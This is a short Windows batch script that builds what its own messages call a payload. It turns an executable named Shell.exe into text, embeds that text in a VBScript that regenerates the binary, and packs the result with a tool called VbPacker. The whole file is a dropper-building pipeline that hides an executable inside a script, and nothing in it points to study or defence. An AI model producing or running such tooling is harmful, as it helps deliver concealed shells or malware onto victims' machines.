@echo off

echo Building Text Representation of Binary
BuildText.vbs Shell.exe Shell.txt

echo Generating New Payload Script
type GenerateBinary.vbs > _temp.tmp
type Shell.txt > GenerateBinary-Generated.vbs
type _temp.tmp >> GenerateBinary-Generated.vbs
del _temp.tmp

echo Packing the payload script 
VbPacker GenerateBinary-Generated.vbs GenerateBinary-Generated.packed.vbs

echo Done!

